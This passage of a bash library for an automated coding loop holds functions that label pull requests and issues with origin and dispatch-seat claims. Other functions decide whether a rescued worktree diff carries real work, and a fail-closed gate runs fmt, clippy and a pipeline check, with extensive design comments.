    existing=$(timeout 15 gh pr view "$pr_ref" --repo "senara-solutions/${repo}" \
        --json labels --jq '.labels[].name' 2>/dev/null | grep '^origin:' || true)
    if [ -n "$existing" ]; then
        if [ "$existing" = "$label" ]; then
            return 0
        fi
        echo "pr_origin.already_claimed: ${repo} PR ${pr_ref} already carries '${existing}'; not overwriting with '${label}'" >&2
        return 0
    fi

    if timeout 15 gh pr edit "$pr_ref" --repo "senara-solutions/${repo}" --add-label "$label" >/dev/null 2>&1; then
        _record_pr_origin_epoch
        return 0
    fi

    timeout 15 gh label create "$label" \
        --repo "senara-solutions/${repo}" \
        --color "$MIKA_PR_ORIGIN_LABEL_COLOR" \
        --description "Origin of this PR, stamped by its producer (mika#2026)" \
        >/dev/null 2>&1 || true

    if timeout 15 gh pr edit "$pr_ref" --repo "senara-solutions/${repo}" --add-label "$label" >/dev/null 2>&1; then
        _record_pr_origin_epoch
        return 0
    fi

    echo "pr_origin.stamp_failed: could not apply '${label}' to ${repo} PR ${pr_ref} — this PR will read as unclassified in scripts/pr-origin-report.sh" >&2
    return 1
}

# _record_pr_origin_epoch — write the first-stamp instant, exactly once.
#
# The reader treats "no origin label" as informative only from this instant on.
# Writing it here — in the producer, on the first successful stamp — makes the
# cut-off a fact someone recorded rather than a date someone guessed. Best-effort:
# a failure to record leaves the epoch undetermined, and an undetermined epoch
# makes the reader classify nothing, which is the safe direction.
_record_pr_origin_epoch() {
    [ -f "$MIKA_PR_ORIGIN_EPOCH_FILE" ] && return 0
    mkdir -p "$(dirname "$MIKA_PR_ORIGIN_EPOCH_FILE")" 2>/dev/null || return 0
    date -u +%Y-%m-%dT%H:%M:%SZ > "$MIKA_PR_ORIGIN_EPOCH_FILE" 2>/dev/null || true
    return 0
}

# _stamp_issue_seat <repo> <issue_num> <labels_csv> — claim the issue for the loop.
#
# Symmetric to _stamp_pr_origin (mika#2026), carried by the ISSUE and not the PR:
# the loop is a dispatch seat like ssc and mpc (webhook_dispatch.rs
# CURRENT_DISPATCH_SEAT), and until mika#2155 it was the only seat that never
# said so. `origin:loop` on the PR answers "who produced this artefact?" and is
# permanent; `dispatch:loop` on the issue answers "who is writing on this branch
# right now?" and lives exactly as long as the dispatch — see _release_issue_seat.
#
# `labels_csv` is the snapshot _set_up_worktree already fetched for its own
# #2012 gate — one `gh issue view` per dispatch (mika#2178), no second read
# inside this function. The engine's seat gate read GitHub separately and
# earlier, in Rust (executor.rs fetch_issue_labels_unless_pull_request), before
# it spawned this handler: a `dispatch:*` posed between that read and this one
# shows up here as owned_by_other. Passing the snapshot in also makes the
# function testable with the three label populations injected directly.
#
# Three outcomes, on that snapshot:
#   another dispatch:* present  → dispatch_seat.owned_by_other, NO write (AC3)
#   dispatch:loop present       → dispatch_seat.already_owned,  NO write (AC2)
#   no dispatch:* at all        → gh issue edit --add-label dispatch:loop
#
# This is NOT a second classifier. classify_dispatch_seat (Rust) knows the seat
# list, the empty seat, the multiple-seat case; this function answers one binary
# question — "may I write dispatch:loop here without covering someone's claim?"
# — and an unknown seat, an empty seat, or two seats all answer "no" for the
# same reason. Refusing the DISPATCH stays the engine's job (mika#2084, three
# sites upstream of dispatch-lib); a fourth refusal in shell is the drift #2084
# built one pure function to avoid.
#
# No `gh label create` fallback, unlike _stamp_pr_origin: dispatch:loop is a
# SEAT label whose vocabulary is guarded Rust↔YAML on mika (mika#2092). Creating
# it on the fly on mika-cloud / mika-skills / mika-platform would fabricate a
# seat outside that guard. On those repos the edit fails, `stamp_failed` says
# so, and the dispatch proceeds — the ticket puts other repos out of scope.
#
# The label is written as a literal, not `dispatch:${SEAT}`: rule L5 in
# scripts/check-canonical-tokens.sh ignores any label containing `$`, and the
# literal is what lets it confront this write with .github/labels.yml. That is
# a third copy of the word "loop" (Rust, YAML, shell) — Rust↔YAML is guarded by
# check-dispatch-seats-declared.sh, shell↔YAML by L5; transitivity holds.
#
# Returns 0 when the issue carries the label, 1 when it could not be applied —
# with a named line on stderr. Callers MUST invoke with `|| true`: the label is
# a signal for the other seats, not a barrier for this one (AC2).
_stamp_issue_seat() {
    local repo="$1" issue="$2" labels_csv="$3" seat_labels
    [ -n "$repo" ] && [ -n "$issue" ] || return 0

    seat_labels=$(printf '%s\n' "$labels_csv" | tr ',' '\n' | sed 's/^ *//;s/ *$//' \
        | tr '[:upper:]' '[:lower:]' | grep '^dispatch:' || true)

    if [ -n "$seat_labels" ]; then
        if [ "$seat_labels" = "dispatch:loop" ]; then
            echo "dispatch_seat.already_owned: ${repo}#${issue} already carries dispatch:loop; not re-stamping" >&2
            return 0
        fi
        echo "dispatch_seat.owned_by_other: ${repo}#${issue} carries '$(printf '%s\n' "$seat_labels" | paste -sd, -)'; refusing to stamp dispatch:loop — the engine's seat gate (mika#2084) is the authority on whether this dispatch may proceed" >&2
        return 1
    fi

    # Bounded: a hanging GitHub API must not hold the dispatch it merely announces.
    if timeout 15 gh issue edit "$issue" --repo "senara-solutions/${repo}" --add-label dispatch:loop >/dev/null 2>&1; then
        echo "dispatch_seat.stamped: ${repo}#${issue} labeled dispatch:loop" >&2
        return 0
    fi
    echo "dispatch_seat.stamp_failed: could not apply dispatch:loop to ${repo}#${issue} — other seats will not see this claim; dispatch proceeds" >&2
    return 1
}

# _release_issue_seat <repo> <issue_num> — end the loop's live claim (AC4).
#
# Decision (mika#2155 C-4): dispatch:loop is retired BEFORE the callback that
# lets mika-dev start the next dispatch on this ticket (`_deliver_callback`,
# ahead of `mika ask --task-complete`), and again at the head of the EXIT trap
# as the crash/cancel backstop. Two sites, one claim: the first successful
# release drops ISSUE_SEAT_CLAIMED, the second is then a no-op. Releasing after
# the callback instead would leave a window where the next dispatch reads a
# label its predecessor is about to remove, does not stamp (already_owned), and
# then runs unclaimed for its whole life — the seat gate disarmed by the very
# mechanism meant to arm it (review finding #2). Kept past the exit it would answer "who
# is writing on this branch?" with a name when nobody is: between a groom and
# its implement, between an open PR and its review, a human seat may take the
# branch, and a `dispatch:mpc` posed beside a stale `dispatch:loop` reads
# `multiple_seat_labels` and is refused — fail-closed, but one manual gesture
# per ticket for everyone. The permanent provenance is `origin:loop` on the PR.
#
# Unconditional once the dispatch went past its no-dispatch exits
# (ISSUE_SEAT_CLAIMED=1), whether or not THIS run's stamp succeeded: a
# dispatch:loop left by an earlier run that died without its EXIT trap
# (SIGKILL, host reboot) is stale, and this is where it heals — gating on
# "I stamped it" would keep that residue forever (the next run reads
# already_owned, does not stamp, and would therefore never release).
# dispatch:loop is the loop's label — nothing else writes it, so nothing else
# is being undone here. Never names any other dispatch:* label. Bounded: this
# runs in the exit trap, whose job is to get RESULT back to mika-dev.
_release_issue_seat() {
    local repo="$1" issue="$2"
    [ "${ISSUE_SEAT_CLAIMED:-0}" = "1" ] || return 0
    [ -n "$repo" ] && [ -n "$issue" ] || return 0
    if timeout 15 gh issue edit "$issue" --repo "senara-solutions/${repo}" --remove-label dispatch:loop >/dev/null 2>&1; then
        # The claim is over: the second site (callback, then exit trap) becomes
        # a no-op instead of a second, idempotent-but-pointless API call. On
        # failure the flag stays up so that later site retries once more.
        ISSUE_SEAT_CLAIMED=0
        echo "dispatch_seat.released: ${repo}#${issue} no longer carries dispatch:loop" >&2
        return 0
    fi
    echo "dispatch_seat.release_failed: could not remove dispatch:loop from ${repo}#${issue} — the claim outlives this dispatch until the next one on this ticket exits" >&2
    return 1
}

# _derive_recovery_pr_title — Compute a conventional-commit PR title for
# recovery-class PRs. Called by the recovery block (mika#1282 + mika#1396).
#
# For commit-pushed-no-pr: reads the impl commit subject from branch tip.
# For dirty-worktree: reads the plan file H1 or falls back to issue title.
#
# Args:
#   $1 — recovery class ("dirty-worktree" or "commit-pushed-no-pr")
#   $2 — worktree dir
#   $3 — repo name
#   $4 — issue number
#   $5 — labels (comma-separated)
#   $6 — issue title
#
# Outputs: PR title string to stdout
_derive_recovery_pr_title() {
    local recovery_class="$1"
    local wt_dir="$2"
    local repo="$3"
    local issue_num="$4"
    local labels="$5"
    local issue_title="$6"

    # mika#2492 widens this arm to `no-shipping-tail`: both classes reach here
    # with the pilot's own implementation commit at the branch tip, so its
    # subject is the right title for either. The other two callers (dirty-worktree,
    # and any fallback) are untouched.
    if [ "$recovery_class" = "commit-pushed-no-pr" ] || [ "$recovery_class" = "no-shipping-tail" ]; then
        local impl_subject
        impl_subject=$(git -C "$wt_dir" log -1 --format='%s' HEAD 2>/dev/null)
        if [ -n "$impl_subject" ]; then
            echo "$impl_subject"
            return
        fi
    fi

    # dirty-worktree or fallback: derive from plan H1 + labels
    local type_prefix
    type_prefix=$(_label_to_type "$labels")

    # Look for plan file
    local plan_file
    plan_file=$(find "$wt_dir/docs/plans" -name "*-${issue_num}-*-plan.md" 2>/dev/null | sort -r | head -1)

    if [ -n "$plan_file" ]; then
        local plan_h1
        plan_h1=$(head -5 "$plan_file" | grep -m1 '^# ' | sed 's/^# //')
        if [ -n "$plan_h1" ]; then
            # Check if H1 already has conventional-commit format
            if grep -qE -- '^(feat|fix|chore|docs|refactor|test|perf|ci)[:(]' <<<"$plan_h1"; then
                echo "$plan_h1"
                return
            fi
            echo "${type_prefix}: ${plan_h1} (${repo}#${issue_num})"
            return
        fi
    fi

    # Final fallback: issue title
    if grep -qE -- '^(feat|fix|chore|docs|refactor|test|perf|ci)[:(]' <<<"$issue_title"; then
        echo "$issue_title"
        return
    fi
    echo "${type_prefix}: ${issue_title} (${repo}#${issue_num})"
}

# _rescue_diff_carries_work — does the captured diff carry any actual work?
#
# mika#2157. The rescue net used to write `Closes #N` unconditionally, without
# ever looking at what it had captured. A grooming worktree contains, at
# minimum, dispatch-lib's own side effect: two lines appended to
# `.claude/groom-verdict-trail.log` by `_append_groom_verdict_trail`. Wrapped
# into a PR carrying `Closes #N`, that is an instruction GitHub executes
# AUTOMATICALLY on merge — while the two protections around it (`--draft` and
# `<!-- rescue-pipeline-verified: no -->`) are both revocable by a single human
# gesture. The asymmetry sat on the wrong side; this predicate moves it back.
#
# The incident-artefact list below is not an intuition: it is the union of the
# two places dispatch-lib ALREADY declares "this is mine, not the pilot's work" —
#   * `_clean_worktree_for_rebase` Tier 2 (four surgical resets: the groom trail,
#     `.iterate/`, `docs/plans/`, `.claude/commands/`), and
#   * the rescue commit's own `git add -A` exclusions (`.claude/commands/`,
#     `.claude/claude-pilot.json`, `.claude/settings.local.json`,
#     `.claude/*.local.*`), whose NOTE line already calls them "scaffold paths".
# A path the rebase overwrites, or that the rescue refuses to stage, cannot be a
# deliverable. Keep all three sites in step — they express one notion in three
# spellings and can drift (mika#2157 R3).
#
# The list is deliberately CLOSED and SHORT: any path not listed counts as work.
# Every path added here takes weight away from the net in its useful case, so an
# extension must arrive with its symmetric test.
#
# Base is the THREE-dot form `origin/main...HEAD` — the file set GitHub shows on
# the PR, i.e. what this branch introduces relative to the merge base. This
# diverges deliberately from `_ac6_verbatim_stats_block`'s two-dot form: the
# question here is "what does this PR carry", not "how does it differ from main's
# tip". On a freshly-rebased branch the two coincide; on a branch that is behind,
# only the three-dot form answers the question actually being asked.
#
# `core.quotePath=false` + `-z` is load-bearing, not hygiene. Under git's default
# `core.quotePath=true`, ANY path holding a non-ASCII byte comes back wrapped in
# double quotes with octal escapes — `"docs/plans/\303\251tude-plan.md"` — which
# matches none of the `case` patterns below, falls through to `*)`, and returns
# "carries work". That is a fail-OPEN on exactly the input this repo produces
# every day: its plans, logs and tickets are written in French. Reading the list
# NUL-delimited and unquoted is what makes the classifier see the real path.
# (Process substitution rather than `$(...)`: bash drops NUL bytes inside command
# substitution, which would splice every path into one unmatched blob.)
#
# Args: $1 — worktree dir
# Returns: 0 when the diff holds at least one non-incident path.
#          1 in EVERY other case — fully-incident diff, empty diff, or a diff
#          that could not be measured (no fetched `origin/main`, broken repo).
#          Fail-closed is the ticket's own argument applied to its own fix:
#          erring toward `Refs` leaves a ticket open for an operator to close by
#          hand — visible, reversible, one line in a list. Erring toward
#          `Closes` is a silent closure nobody measures. A measurement failure
#          does not get to land on the automatic side.
_rescue_diff_carries_work() {
    local wt_dir="$1" f

    # Guard mirrored from _clean_worktree_for_rebase, for its stated reason:
    # `git -C ""` silently operates on the dispatch process CWD — a live
    # checkout. An empty $wt_dir would therefore measure the WRONG tree, and if
    # that tree happens to carry real work the answer lands fail-OPEN, which is
    # the one direction this ticket forbids. Not reachable on today's paths
    # (both recovery classes derive from a real worktree), but this is a
    # sourceable primitive: fail closed.
    if [ -z "$wt_dir" ] || ! git -C "$wt_dir" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
        return 1
    fi

    while IFS= read -r -d '' f; do
        [ -n "$f" ] || continue
        case "$f" in
            .claude/groom-verdict-trail.log) ;;
            .claude/commands/*)              ;;
            .claude/claude-pilot.json)       ;;
            .claude/*.local.*)               ;;
            .iterate/*)                      ;;
            docs/plans/*)                    ;;
            *) return 0 ;;
        esac
    done < <(git -C "$wt_dir" -c core.quotePath=false diff --name-only -z origin/main...HEAD 2>/dev/null)
    return 1
}

# ─────────────────────────────────────────────────────────────────────────────
# _rescue_touches_tracked_tree — would this PR publish anything the repo knows?
#
# mika#2503. PR #2502 (impl of #2497) carried 28 files — `.v1probe/Cargo.toml`,
# `.v1probe/src/lib.rs` and the whole of `.v1probe/target/` — and zero
# implementation: a scratch probe crate the pilot built, auto-committed by the
# mika#1282 rescue and opened as a draft PR. QA blocked it 7/7. #2486 was the
# same mechanism the day before.
#
# THE QUESTION, and there is exactly one: does the content this PR would publish
# touch at least one place the repository already knows about? Take the FIRST
# SEGMENT of every path in the diff; if any of them exists in the reference
# tree's top level, answer yes.
#
#   .v1probe/Cargo.toml, .v1probe/src/lib.rs  -> `.v1probe`, absent  -> NO
#   crates/mika-agent/src/foo.rs              -> `crates`,   present -> yes
#   crates/mika-newthing/src/lib.rs (new)     -> `crates`,   present -> yes
#   docs/plans/...-plan.md                    -> `docs`,     present -> yes
#
# THE REFERENCE TREE IS origin/main, NEVER HEAD — and this is the one detail
# that decides whether the fix works at all. This predicate is consulted AFTER
# the rescue commit, so `git ls-tree --name-only HEAD` CONTAINS `.v1probe`: the
# rescue itself just put it there. Measured 2026-09-23 on the founding case: the
# HEAD form answers "yes" and the whole fix is INERT while passing every local
# test. Same base as the diff, which is also what keeps the two halves of the
# measurement consistent. The merge-base was considered and rejected: a
# first-level directory born on main after this branch left (`site/`, say) would
# be unknown to it, and a pilot legitimately working there would be refused.
#
# WHY PER-SEGMENT AND NOT "a crate not declared in the workspace". That second
# formulation is true of #2502 but Cargo-specific, and dispatch-lib is deployed
# in four repos not all of which are Rust workspaces. It is also more fragile: a
# pilot that writes a legitimate crate and forgets to declare it would have its
# implementation refused. Asking only "is this first segment known" requires no
# language knowledge, which is what lets this half travel where the `.gitignore`
# half cannot.
#
# FAIL-OPEN, WHICH IS THE INVERSE OF ITS IMMEDIATE NEIGHBOUR ABOVE, DELIBERATELY.
# `_rescue_diff_carries_work` is fail-CLOSED because its expensive error is an
# automatic ticket closure nobody measures. This one's expensive error is
# blocking the loop's NOMINAL path — `no-shipping-tail` (mika#2492) goes through
# the same `if` — and, worse, the asymmetry of the underlying loss:
#   * refusing real content is an IRREVERSIBLE loss of implementation (it exists
#     in one place only, and `_set_up_worktree` force-removes the worktree on the
#     next dispatch). That is the defect mika#1282 exists to prevent.
#   * rescuing scratch is a phantom PR: QA blocks it, an operator closes it.
#     Reversible, and it is the state of the world today.
# Two neighbouring predicates, two polarities; each states its own reason at its
# own site, or a reviewer "harmonizes" whichever one they are moving.
#
# It does NOT compose with `_rescue_diff_carries_work`'s incident list
# (`.claude/groom-verdict-trail.log`, `.iterate/`, `docs/plans/`, ...). One
# question per predicate; and on the measured case no incident path is in play,
# so composing would change nothing while making the two inseparable.
#
# Args: $1 — worktree dir
# Returns: 0 (open the PR) when at least one first segment is known to the
#          reference tree, AND in every case the answer cannot be measured:
#          empty/unreadable worktree, no fetched origin/main, empty reference
#          tree, empty diff.
#          1 (refuse) only on a positive measurement that nothing is known.
_rescue_touches_tracked_tree() {
    local wt_dir="${1-}" f seg

    # Same guard, same reason, as `_rescue_diff_carries_work`: `git -C ""`
    # silently operates on the dispatch process CWD — a live checkout — so an
    # empty $wt_dir would measure the WRONG tree. There it must fail closed;
    # here it must fail open. Same hazard, opposite safe answer.
    if [ -z "$wt_dir" ] || ! git -C "$wt_dir" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
        return 0
    fi

    # The reference tree's top level. Unreadable or empty (no fetched
    # origin/main, degenerate empty-tree commit) => nothing can ever match =>
    # open, rather than refuse every PR in the repo.
    local _tree
    _tree=$(git -C "$wt_dir" ls-tree --name-only origin/main 2>/dev/null) || return 0
    [ -n "$_tree" ] || return 0

    # `core.quotePath=false` + `-z` for the reason written on
    # `_rescue_diff_carries_work`: under git's default, any path holding a
    # non-ASCII byte comes back quoted with octal escapes, and this repo's plans
    # and tickets are written in French every day. (Process substitution rather
    # than `$(...)`: bash drops NUL bytes inside command substitution, which
    # would splice every path into one blob.)
    local _measured=0
    while IFS= read -r -d '' f; do
        [ -n "$f" ] || continue
        _measured=1
        seg="${f%%/*}"
        # A file at the repo root has itself as its first segment.
        if printf '%s\n' "$_tree" | grep -qxF -- "$seg"; then
            return 0
        fi
    done < <(git -C "$wt_dir" -c core.quotePath=false diff --name-only -z origin/main...HEAD 2>/dev/null)

    # An empty diff is not a positive measurement that the content is scratch —
    # there is no content. Open (and the gate's other terms decide).
    [ "$_measured" = "1" ] || return 0
    return 1
}

# ─────────────────────────────────────────────────────────────────────────────
# _measure_pipeline_verified — give `rescue-pipeline-verified` a producer.
#
# mika#2354. Two gates read `<!-- rescue-pipeline-verified: yes -->` — qa-review
# Step 1.5 (marker `no` + draft ⇒ `hold[review]`, review over before Step 2) and
# `wip_rescue` (since mika#2286 a DECISION-CORE draft is un-drafted only on the
# literal `yes`, otherwise parked). And `grep -rn "rescue-pipeline-verified: yes"`
# over `skills/`, `scripts/` and `crates/mika-agent/src/` returns ONLY readers:
# no site in this repo has ever written `yes`. The single path to that value was
# a human hand editing the PR body — so the drain could not be autonomous, not
# because it broke, but because the marker that unblocks it had no producer.
#
# `_compose_rescue_pr_body` wrote the literal `no` unconditionally, thirty lines
# below, while its sibling `rescue-diff` marker is a MEASURED fact
# (`_rescue_diff_carries_work`). The producer/consumer split existed for one of
# the two markers; this is the other one's missing half.
#
# WHAT `yes` MEANS, and it is deliberately narrow: "the local pipeline is
# complete, the review may begin". NOT "this work is good" — that is the review
# that follows. mika#2286 fixed the sense of the marker as a FRESH verification,
# and its lesson is why the terms below are EXECUTIONS rather than an inspection
# of shape: a `yes` posed on the mere presence of artefacts would reopen that
# ticket under another name.
#
# Conjunction, cheapest term first, short-circuited on the first failure:
#   1. diff             — the captured diff carries work (reuses the mika#2157
#                         predicate; an incident-only diff can satisfy no AC and
#                         has nothing to verify)
#   2. worktree-dirty   — nothing left outside the commit the PR will publish,
#                         under the rescue's own scaffold exclusions
#   3. fmt              — `cargo fmt --all --check`
#   4. clippy           — `cargo clippy --workspace --all-targets -- -D warnings`
#   5. verify-pipeline  — `scripts/verify-pipeline.sh origin/main`
#
# `-D warnings` on term 4 follows BOTH house precedents rather than diverging
# from them: `ci.yml` runs `cargo clippy --all-targets --all-features -- -D
# warnings`, and `wip_rescue`'s own clippy gate (`wip_rescue.rs`) runs
# `cargo clippy --manifest-path … --tests -- -D warnings`. It is also the one
# invocation whose exit code expresses the plan's stated criterion ("rc=0, zero
# `warning:` line") without parsing output.
#
# `origin/main` on term 5 is LOAD-BEARING, not decoration: `verify-pipeline.sh`
# defaults to `BASE_REF="${1:-main}"`, and a dispatch worktree's local `main` can
# be days stale — the docs/source bucket split would then be computed on a diff
# that is not the one the PR publishes. `origin/main` is the mode CI uses and the
# script's own usage block documents.
#
# Term 5 is STRICTER here than in CI, knowingly (mika#2354 § Fire-Disposition
# D1-bis): two of the script's three exemption mechanisms read artefacts that do
# not exist yet at measurement time — the `documentation` label is inherited
# through `Closes #N` in the PR BODY (`gh pr create` has not run), and the
# `pipeline-exempt` label is read from `GITHUB_EVENT_PATH` (absent off-runner).
# Only the `Pipeline-Exempt:` commit trailer works. A legitimately docs-only
# ticket therefore reads `no` here while it would pass in CI. That `no` is
# accepted rather than compensated: it sits on the safe side of the asymmetry
# below, and the body names the term so the operator reads the cause instead of
# investigating it. The remedy, if the measured frequency justifies one, is a
# fourth exemption mechanism readable BEFORE the PR exists — a separate ticket,
# never a term 5 made permissive here.
#
# FAIL-CLOSED WITHOUT EXCEPTION. Anything that is not an explicit success yields
# `no`: missing command, exhausted budget, empty `$WORKTREE_DIR`, unreadable
# repo, absent or non-executable `verify-pipeline.sh`. We can therefore never be
# more permissive than today, where the value is `no` in every circumstance. The
# asymmetry is the one mika#2157 already arbitrated on this very PR body: one
# `no` too many costs a visible, reversible operator gesture; one `yes` too many
# opens the review on incomplete work, and the two remaining protections
# (`--draft`, the marker) are "revocable by a single human gesture".
#
# Args: $1 — worktree dir
# Returns: 0 when every term holds, and prints NOTHING.
#          1 otherwise, printing the failing term's wire name on the FIRST line
#          and an excerpt of its output on the following ones. The caller splits
#          on that first newline.
_measure_pipeline_verified() {
    local wt_dir="$1"
    local budget deadline remaining out rc

    # Same guard, same reason, as `_rescue_diff_carries_work`: `git -C ""`
    # silently operates on the dispatch process CWD — a live checkout — so an
    # empty dir would measure the WRONG tree, and a tree that happens to be
    # clean would land fail-OPEN, the one direction forbidden here.
    if [ -z "$wt_dir" ] || ! git -C "$wt_dir" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
        printf 'worktree-unusable\nnot a readable git worktree: %s\n' "${wt_dir:-<empty>}"
        return 1
    fi

    budget=$(_rescue_verify_budget_secs)
    deadline=$(( $(date +%s) + budget ))

    # ── Term 1: the diff carries work ───────────────────────────────────────
    if ! _rescue_diff_carries_work "$wt_dir"; then
        printf 'diff\nthe captured diff carries no work (incident-only, empty, or unmeasurable)\n'
        return 1
    fi

    # ── Term 2: nothing left outside the commit the PR will publish ─────────
    # Same scaffold exclusions as the rescue commit's own `git add -A`: a path
    # the rescue refuses to stage is not pilot content and must not make the
    # worktree read dirty. One list, on RESCUE_EXCLUDE_PATHSPEC (mika#2348 D2).
    # `-c core.quotePath=false` for the reason `_rescue_diff_carries_work`
    # states — this repo's paths are written in French.
    out=$(git -C "$wt_dir" -c core.quotePath=false status --porcelain -- \
        "${RESCUE_EXCLUDE_PATHSPEC[@]}" 2>&1) || {
        printf 'worktree-dirty\ncould not read worktree status\n%s\n' "$(_rescue_verify_excerpt "$out")"
        return 1
    }
    if [ -n "$out" ]; then
        printf 'worktree-dirty\n%s\n' "$(_rescue_verify_excerpt "$out")"
        return 1
    fi

    # ── Term 3: formatting ──────────────────────────────────────────────────
    remaining=$(( deadline - $(date +%s) ))
    if [ "$remaining" -le 0 ]; then
        printf 'budget\nthe %ss measurement budget was exhausted before `cargo fmt`\n' "$budget"
        return 1
    fi
    # `if out=$(…); then rc=0; else rc=$?; fi` rather than `out=$(…); rc=$?`:
    # the handlers source this file under `set -e`, where a failing command
    # substitution in a plain assignment terminates the dispatch outright.
    if out=$(_rescue_verify_run "$remaining" "$wt_dir" cargo fmt --all --check 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -ne 0 ]; then
        [ "$rc" -eq 124 ] && { printf 'budget\n`cargo fmt --all --check` exceeded the remaining measurement budget\n'; return 1; }
        printf 'fmt\n%s\n' "$(_rescue_verify_excerpt "$out")"
        return 1
    fi

    # ── Term 4: lint ────────────────────────────────────────────────────────
    remaining=$(( deadline - $(date +%s) ))
    if [ "$remaining" -le 0 ]; then
        printf 'budget\nthe %ss measurement budget was exhausted before `cargo clippy`\n' "$budget"
        return 1
    fi
    if out=$(_rescue_verify_run "$remaining" "$wt_dir" cargo clippy --workspace --all-targets -- -D warnings 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -ne 0 ]; then
        [ "$rc" -eq 124 ] && { printf 'budget\n`cargo clippy` exceeded the remaining measurement budget\n'; return 1; }
        printf 'clippy\n%s\n' "$(_rescue_verify_excerpt "$out")"
        return 1
    fi

    # ── Term 5: the /mika pipeline's own artefact check ─────────────────────
    if [ ! -x "$wt_dir/scripts/verify-pipeline.sh" ]; then
        printf 'verify-pipeline\nscripts/verify-pipeline.sh is absent or not executable in the worktree\n'
        return 1
    fi
    remaining=$(( deadline - $(date +%s) ))
    if [ "$remaining" -le 0 ]; then
        printf 'budget\nthe %ss measurement budget was exhausted before `verify-pipeline.sh`\n' "$budget"
        return 1
    fi
    if out=$(_rescue_verify_run "$remaining" "$wt_dir" ./scripts/verify-pipeline.sh origin/main 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -ne 0 ]; then
        [ "$rc" -eq 124 ] && { printf 'budget\n`verify-pipeline.sh` exceeded the remaining measurement budget\n'; return 1; }
        printf 'verify-pipeline\n%s\n' "$(_rescue_verify_excerpt "$out")"
        return 1
    fi

    return 0
}

# _rescue_verify_enabled — is the mika#2354 measurement armed?
#
# Default armed. `0` / `false` / `no` / `off` (case-insensitive) disarm it, which
# restores the pre-mika#2354 body VERBATIM (`_compose_rescue_pr_body` called with
# its pre-fix argument shape), with no redeploy. The rollback has to be exact:
# one that also changed the shape of the body would not be a rollback, and an
# operator reaching for the switch mid-incident is not in a position to discover
# that.
#
# The variable reaches this process by explicit injection from
# `skills/executor.rs::inject_rescue_verify_env` — `sandboxed_pilot_env` rebuilds
# the child env from a positive allowlist, so nothing crosses by inheritance. A
# setting only its reader honours is a decorative setting (mika#2165).
_rescue_verify_enabled() {
    local raw="${MIKA_RESCUE_VERIFY_ENABLED:-1}"
    case "${raw,,}" in
        0|false|no|off) return 1 ;;
        *) return 0 ;;
    esac
}

# _rescue_verify_budget_secs — the measurement's global budget, in seconds.
#
# House three-tier convention: absent/empty → default; unreadable, `0` or
# negative → default + WARN. `0` does NOT disarm — that is
# `MIKA_RESCUE_VERIFY_ENABLED`'s job, and reading a typo'd budget as a disarm
# would silently restore the producerless marker this ticket exists to remove.
#
# Default 900s, aligned on `wip_rescue`'s clippy gate, which already runs this
# class of work one step downstream.
_rescue_verify_budget_secs() {
    local raw="${MIKA_RESCUE_VERIFY_BUDGET_SECS:-}"
    if [ -z "$raw" ]; then
        echo 900
        return
    fi
    if ! [[ "$raw" =~ ^-?[0-9]+$ ]] || [ "$raw" -le 0 ]; then
        echo "WARN: rescue_verify_budget_invalid: MIKA_RESCUE_VERIFY_BUDGET_SECS='${raw}' is not a positive integer — falling back to 900s" >&2
        echo 900
        return
    fi
    echo "$raw"
}

# _rescue_verify_run — run one measurement term inside the remaining budget.
#
# `timeout` yields 124 on expiry, which the caller reads as `budget` rather than
# as the term's own failure — the two are different facts and the operator acts
# on them differently. When `timeout` is unavailable the command runs unbounded
# and the caller's next deadline check catches the overrun: the budget still
# holds, one term late. Degrading to "cannot measure" there would be fail-closed
# in the letter and useless in practice on a host missing coreutils.
#
# Args: $1 — seconds remaining, $2 — worktree dir, $3.. — command + args.
_rescue_verify_run() {
    local secs="$1" wt_dir="$2"; shift 2
    if command -v timeout >/dev/null 2>&1; then
        ( cd "$wt_dir" && timeout "$secs" "$@" )
    else
        ( cd "$wt_dir" && "$@" )
    fi
}

# _rescue_verify_excerpt — the part of a failing term's output an operator acts on.
#
# Diagnostic lines first (`error:`, `warning:`, `FAIL:`, rustfmt's `Diff in`, a
# panic), because a cargo invocation's FIRST lines are `Compiling …` and would
# say nothing. Falls back to the head of the output when nothing matches — which
# is the shape `verify-pipeline.sh` already has, its own first line being
# `FAIL: …`. Capped so a red clippy cannot bloat the PR body.
# Written with here-strings and one `awk` rather than `grep | head` pipelines:
# `head` closes the pipe at its limit, the producer takes SIGPIPE, and under the
# `pipefail` this library is sourced into that 141 becomes the pipeline's status
# (mika#2055). No pipeline, no SIGPIPE.
_rescue_verify_excerpt() {
    local out="$1" picked
    picked=$(grep -E '^(error|warning|FAIL|Diff in|thread |note: )' <<<"$out" || true)
    [ -z "$picked" ] && picked=$(grep -v '^[[:space:]]*$' <<<"$out" || true)
    awk 'NR<=12 { print substr($0, 1, 500) }' <<<"$picked"
}

# _compose_rescue_pr_body — build the body of a recovery PR (mika#2157).
#
# Extracted from the heredoc that used to sit inline in `gh pr create`'s --body
# argument, on the precedent `_derive_recovery_pr_title` already set for the
# title. Under the inline shape the closing-reference decision was only testable
# by stubbing `gh` and re-reading its argv; as a function it is exercised against
# real temporary git repositories, so the probe traverses the actual `git diff`
# instead of a reconstruction of it written from the plan.
#
# Emits `<!-- rescue-diff: carries-work -->` + `Closes #N` when the captured diff
# carries work, and `<!-- rescue-diff: incident-only -->` + `Refs #N` otherwise,
# with the incident-only case announced in the body's FIRST line. qa-review
# Step 1.5 reads that marker rather than re-judging the diff: the producer
# measures once, the consumer reads — the same shape mika#1618 established for
# the `rescue-pipeline-verified` marker, and for the same reason (two independent
# judgements of one fact diverge).
#
# mika#2354 gave the OTHER marker its producer: `rescue-pipeline-verified` is no
# longer the hard-coded literal `no` but the measured verdict of
# `_measure_pipeline_verified`, passed in by the caller. Passed in rather than
# measured here, deliberately: this function is called by tests against
# throwaway repositories, and running two cargo invocations to compose a string
# would make the composer's own tests depend on the health of a temp crate.
#
# Args: $1 — worktree dir
#       $2 — recovery class ("dirty-worktree" or "commit-pushed-no-pr")
#       $3 — class fact sentence
#       $4 — issue number
#       $5 — pipeline-verified verdict, `yes` or `no` (mika#2354; anything that
#            is not the literal `yes` reads as `no` — fail-closed, and an absent
#            argument keeps the pre-mika#2354 call shape working)
#       $6 — failing term's wire name, empty when none (kill-switch, or `yes`)
#       $7 — excerpt of the failing term's output, empty when none
# Reads SESSION_ID / TURNS / COST from the environment, as the heredoc did.
